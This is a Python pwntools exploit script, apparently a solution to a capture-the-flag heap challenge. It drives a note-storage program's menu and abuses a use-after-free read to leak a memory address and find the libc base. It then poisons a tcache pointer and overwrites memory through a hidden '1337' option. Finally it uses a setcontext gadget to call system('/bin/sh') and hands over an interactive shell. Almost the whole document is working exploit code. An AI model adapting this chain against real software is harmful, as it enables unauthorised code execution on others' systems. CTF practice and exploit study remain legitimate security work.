#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from setcontext32 import setcontext32 

exe = context.binary = ELF('lfs_patched')
libc = exe.libc
# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
directory /tmp/pwn/ictf
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

i = 0

def init():
    global io

    io = start()

def create(size, content, tag):
    global i
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b">", str(size).encode())
    io.sendafter(b"?", content)
    io.sendafter(b"?", tag)
    io.sendline()
    i += 1
    return i - 1

def delete(idx):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b">", str(idx).encode())

def export_by_index(idx):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b">", str(idx).encode())
    io.recvline_contains(b"---begin,index=")
    return io.recvuntil(b"---end,index=", drop=True)
    
def export_by_tag(tag):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b">", str(tag).encode())

def extend_metadata(idx, size, tag):
    io.sendlineafter(b">", b"1337")
    io.sendlineafter(b">", str(idx).encode())
    io.sendlineafter(b">", str(size).encode())
    io.sendafter(b"?", tag)
    io.sendline()


def solve():

    a = create(0x23000-0x18, b"a", b"a")
    b = create(0x23000-0x18, b"b", b"a"*0x10 + p64(0x410|0x1))
    c = create(0x23000-0x18, b"c", b"a"*0x10 + p64(0x410|0x1))
    delete(a)
    delete(b)
    mmap_addr = u64(export_by_index(a)[:6].ljust(8, b"\x00")) << 12
    libc.address = mmap_addr + 0x26000
    info("libc base: %#x", libc.address)
    delete(c)

    dest, payload = setcontext32(
        libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()
    )

    c = create(0x24000-0x18, b"d", b"A"*0x10 + p64(0x410) + p64(((mmap_addr >> 12) - 0x23) ^ dest))
    extend_metadata(c, 0x408, b"a"*0x408)
    extend_metadata(c, 0x408, payload[:0x408])

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

